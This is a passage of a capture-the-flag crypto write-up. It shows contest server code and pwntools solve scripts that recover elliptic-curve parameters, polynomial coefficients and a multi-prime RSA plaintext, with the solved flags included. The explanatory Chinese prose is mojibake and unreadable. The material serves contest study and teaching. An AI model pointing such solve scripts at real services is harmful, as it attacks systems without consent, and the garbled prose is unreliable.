</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>ç±»ä¼¼LCGè®¡ç®— $a,b,p$ çš„æ–¹æ³•ï¼Œåˆ©ç”¨ç»“å¼è®¡ç®— $a,b,p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> sage.matrix.matrix2 <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="built_in">int</span>(<span class="number">8763</span>))</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Luck!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">    (x1,y1),(x2,y2),(x3,y3),(x4,y4) = <span class="built_in">eval</span>(r.recvline().replace(<span class="string">b&#x27;) (&#x27;</span>, <span class="string">b&#x27;), (&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = (y1^<span class="number">2</span>+k1*p)-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = (y2^<span class="number">2</span>+k2*p)-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    f3 = (y3^<span class="number">2</span>+k3*p)-(x3^<span class="number">3</span>+a*x3+b)</span><br><span class="line">    f4 = (y4^<span class="number">2</span>+k4*p)-(x4^<span class="number">3</span>+a*x4+b)</span><br><span class="line">    g1 = resultant(f1, f2, b)</span><br><span class="line">    g2 = resultant(f2, f3, b)</span><br><span class="line">    g3 = resultant(f3, f4, b)</span><br><span class="line">    h1 = resultant(g1, g2, a)</span><br><span class="line">    h2 = resultant(g2, g3, a)</span><br><span class="line">    p_gcd = gcd(h1(p=<span class="number">0</span>),h2(p=<span class="number">0</span>))</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">zip</span>(*factor(p_gcd)))[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    f1 = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = y2^<span class="number">2</span>-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    g = resultant(f1, f2, b)</span><br><span class="line">    a = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    b = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f2(a,b))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;me &#x27;</span>)</span><br><span class="line">    op = r.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(op)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(a).encode())</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">b&#x27;b&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(b).encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(p).encode())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:2613 One bullet to kill all Outlaws.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>æœ¬è´¨æ˜¯è¿›åˆ¶è½¬æ¢çš„è®¡ç®—æ–¹æ³•ï¼Œæä¾› $x$ åç»™å‡º $\sum\limits_{i=0}^{128}p_ix^i$ï¼Œæ±‚å„ $p_i$ã€‚åˆ©ç”¨å–ä½™å’Œæ•´é™¤è®¡ç®—å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">2613</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">x = <span class="number">4294967295</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;4294967295&#x27;</span>)</span><br><span class="line">c = <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">param = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">     param.append(c % x)</span><br><span class="line">     c = (c-param[-<span class="number">1</span>])//x</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(param).encode().strip(<span class="string">b&#x27;[&#x27;</span>).strip(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Fi1nd-th3-xâ€™"><a href="#Fi1nd-th3-xâ€™" class="headerlink" title="Fi1nd_th3_xâ€™"></a>Fi1nd_th3_xâ€™</h3><blockquote><p>å¬è¯´åœ¨é‚£ä¸ªå¤§é™†æœ‰ä½å«jrl777çš„æ—…è¡Œè€…â€¦â€¦Cryptoerç©¿è¶Šåˆ°äº†æç“¦ç‰¹å°±è¦æ‹¿å‡ºçœŸæœ¬äº‹ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span>* </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">e = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">dP = d%((q-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dQ = d%((p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">dR = d%((p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = s2n(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dP=&#x27;</span>,dP)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dQ=&#x27;</span>,dQ)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dR=&#x27;</span>,dR)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line"><span class="string">q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line"><span class="string">r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line"><span class="string">dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line"><span class="string">dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line"><span class="string">dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line"><span class="string">c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç”±äº $m&lt;qr,m&lt;pr,m&lt;pq$ï¼Œæ•… $m=c^{dP} \bmod {qr}=c^{dQ} \bmod {pr}=c^{dR} \bmod {pq}$ï¼Œå¦åˆ™éœ€åº”ç”¨CRTæ¥æ±‚ $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></span><br><span class="line">q= <span class="number">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></span><br><span class="line">r= <span class="number">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></span><br><span class="line">dP= <span class="number">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></span><br><span class="line">dQ= <span class="number">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></span><br><span class="line">dR= <span class="number">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></span><br><span class="line">c= <span class="number">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></span><br><span class="line"></span><br><span class="line">m1=<span class="built_in">pow</span>(c,dP,q*r)</span><br><span class="line">m2=<span class="built_in">pow</span>(c,dQ,p*r)</span><br><span class="line">m3=<span class="built_in">pow</span>(c,dR,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Quick-Robert"><a href="#Quick-Robert" class="headerlink" title="Quick_Robert"></a>Quick_Robert</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:3042 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Quadratic_residue">https://en.wikipedia.org/wiki/Quadratic_residue</a></p></blockquote><p>å‚è€ƒ <a target="_blank" rel="noopener" 